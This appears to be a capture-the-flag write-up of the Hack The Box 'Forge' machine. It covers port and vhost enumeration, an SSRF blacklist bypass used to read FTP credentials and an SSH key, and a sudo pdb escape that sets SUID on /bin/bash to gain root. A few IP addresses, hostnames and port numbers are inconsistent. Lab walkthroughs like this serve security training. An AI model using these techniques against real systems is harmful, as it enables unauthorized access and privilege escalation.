## Default Information
IP address : 10.10.11.111\
OS : Linux

## Enumeration
Firstly, let us enumerate all the open ports using ```Nmap```
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```bash
nmap -sC -sV -A -p- -T4 10.10.11.101 -vv
```

From the output of ```NMAP```, we find something interesting, which is that this box has an FTP server.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 21	| FTP | NIL | filtered |
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.41 ((Ubuntu)) | Open |

Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
```
nmap -sU -Pn 10.10.11.111 -T4 -vv 
```

Before we continue furthur, we will add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 

```
10.10.11.111    forge.htb
```

## Discovery
Firstly, We will now run ```gobuster``` on ```http://forge.htb``` to enumerate the directories on the endpoints. From the output, we discover an interesting ```/upload``` endpoint.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://forge.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://forge.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/11 13:46:22 Starting gobuster in directory enumeration mode
===============================================================
http://forge.htb/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
http://forge.htb/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/]
http://forge.htb/upload               (Status: 200) [Size: 929]
http://forge.htb/server-status        (Status: 403) [Size: 274] 
===============================================================
2021/09/20 03:27:11 Finished
===============================================================
```

Next, we will run a VHOST enumeration using Gobuster to find possible subdomains on ```http://forge.htb```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster vhost forge.htb -u http://forge.htb/ -w /home/kali/Desktop/subdomains.txt -k -t 50 -o gobuster.txt   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb/
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /home/kali/Desktop/subdomains.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/20 03:12:11 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]                                                                                                           
===============================================================
2021/09/20 03:22:05 Finished
===============================================================
```

Now, we will add the subdomain to our ```etc/hosts``` file. 

```
10.10.11.111    admin.forge.htb forge.htb
```

Visiting http://admin.forge.htb, we get the following message that it only allows connections from localhost. This gives us the idea that to be able to connect to http://admin.forget.htb, the only way would be through Server-Side Request Forgery.

![Message shown on admin.forge.htb](https://github.com/joelczk/writeups/blob/main/HTB/Images/forge/admin_forge.PNG)

Next, we will visit http://forge.htb/upload. We notice that there are 2 options for file uploads (Upload from local files and upload from URL). Let's first test with uploading of local file. 

We notice that upon a successful file upload from local file, we are presented with a URL that will display an error page when we attempt to visit the page. However, on Burp we will be presented with a response that shows the file contents.

![Error page](https://github.com/joelczk/writeups/blob/main/HTB/Images/forge/loal_file_upload_error.PNG)

![Burp output](https://github.com/joelczk/writeups/blob/main/HTB/Images/forge/local_file_upload_burp.PNG)

Next, we will test out file upload by url. We will first try to use http://localhost as the input url. However, we realize that this url is blacklisted and we are unable to access it. Similarly, when we try to use http://admin.forge.htb as the input url we will also realize that the url is blacklisted and we are unable to access it.

However, we realize that we are able to bypass the blacklist by slightly modifying the input url into http://admin.Forge.htb. Afterwhich, we will try to ```curl``` the url that was given to us and we would realize that there are 2 endpoints, ```/announcements``` and ```/upload``` on http://admin.forge.htb

```
┌──(kali㉿kali)-[~]
└─$ curl http://forge.htb/uploads/HyDAiKFTOMSZHPgGqeTL
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html> 
```

Next, we will modify the url to become http://admin.Forge.htb/announcements```, and curling the url that was given to us, we are able to obtain the credentials for our FTP server. We also realized that we can upload images to the endpoint by passing a url with ```/uploads?u=<url>```. This might contain open redirect vulnerabilities if the url used in the parameters are not properly sanitized.

![FTP Credentials](https://github.com/joelczk/writeups/blob/main/HTB/Images/forge/credentials.PNG)
  
Now, we will change the input url to http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@localHost and curl the url obtained. We would realize that we would obtain a directory listing of the current directory in the FTP server.
  
```
┌──(kali㉿kali)-[~]
└─$ curl http://forge.htb/uploads/TMHWQcZBLTlN0DPvha4q
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 26 00:57 user.txt
```

## Obtaining user flag

All that is left for us to do is to modify the input url to http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@localHost/user.txt and curl the obtained url to get the user flag.

```
┌──(kali㉿kali)-[~]
└─$ curl http://forge.htb/uploads/jSUOzXI4ZbmjMSoqJvXs
<Redacted user flag>
```
  
## Obtaining root flag

To obtain the root flag, we need to be able to first SSH into the server. To do that, we need to first obtain the private key that is used for SSH from the FTP server. This can be obtained by modifying the input url to http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@localHost/.ssh/id_rsa. Curling the url that is given to us would then give us the private key that is needed for SSH.

We would then save the private key and SSH into the server using the username, ```user```. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i id_rsa user@10.10.11.111

Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
user@forge:~$ 
```
  
Now, we will check for programs or scripts that can be executed with root privileges without password. This can be checked using ```sudo -l```. Here, we realize that ```/usr/bin/python3 /opt/remote-manage``` can be executed with root privileges without the need for any password.

```
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```
  
Next, we will examine ```/opt/remote-manage.py``` in detail. There are 2 main portions in the code, namely the ```try``` part of the code and the ```except``` part of the code. Let's first examine the ```try``` portion of the code.
  
In the ```try``` protion, we realize that the socket will request for a secret password, which is ```secretadminpassword```. If the secret password has been verified successfully, the code will display out a few options that will execute ```pas aux```, ```df``` and ```ss -lnt``` respectively. 

We also noticed that the selection of options after successfully logging into the server will require the user to input an integer value due to ```option = int(clientsock.recv(1024).strip())```, if not an exception will be thrown.

```
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', port))
sock.listen(1)
print(f'Listening on localhost:{port}')
(clientsock, addr) = sock.accept()
clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
while True:
    clientsock.send(b'\nWhat do you wanna do: \n')
    clientsock.send(b'[1] View processes\n')
    clientsock.send(b'[2] View free memory\n')
    clientsock.send(b'[3] View listening sockets\n')
    clientsock.send(b'[4] Quit\n')
    option = int(clientsock.recv(1024).strip())
    if option == 1:
        clientsock.send(subprocess.getoutput('ps aux').encode())
    elif option == 2:
        clientsock.send(subprocess.getoutput('df').encode())
    elif option == 3:
        clientsock.send(subprocess.getoutput('ss -lnt').encode())
    elif option == 4:
        clientsock.send(b'Bye\n')
        break
```
  
In the ```except``` portion of the code, we realize that we are able to enter the pdb debugger if an exception is raised.
  
```
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
```

Before, we execute the script, lets's check the file permissions of ```/bin/bash```. We notice that the file owner of ```/bin/bash``` is root.
  
```
user@forge:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```
  
Now, we will execute the code using and we will take note of the port number that the localhost is listening on.

```
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:1123
```
  
Afterwards, we will open another terminal and SSH into the server and use netcat to create a reverse connection to the localhost, and enter the secret password to view the given options. Afterwards, we will then input a string to create an exception so that we can enter the debugger
  
```
user@forge:~$ nc localhost 1089
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
sdsdsdsdsdsd
```

After entering the debugger, we will modify the ```/bin/bash``` permissions with ```chmod u+s```. This gives ```/bin/bash```setuid attributes which will then allow any user who are able to execute the file to be able to execute the files with the privileges of the file's owners, which in this case is the root user. This will allow us to execute the ```/bin/bash``` binary with root privileges and obtain our system flag.
  
```
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:54071
invalid literal for int() with base 10: b'sdsdsdsdsd'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system('chmod u+s /bin/bash')
0
(Pdb) exit
```
  
Now, all we have to do is to create a bash shell and obtain the system flag.
  
```
user@forge:~$ /bin/bash -p
bash-5.0# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
bash-5.0# cd root
bash: cd: root: No such file or directory
bash-5.0# find root.txt
find: ‘root.txt’: No such file or directory
bash-5.0# cd /root
bash-5.0# cat root.txt
<Redacted system flag>
```
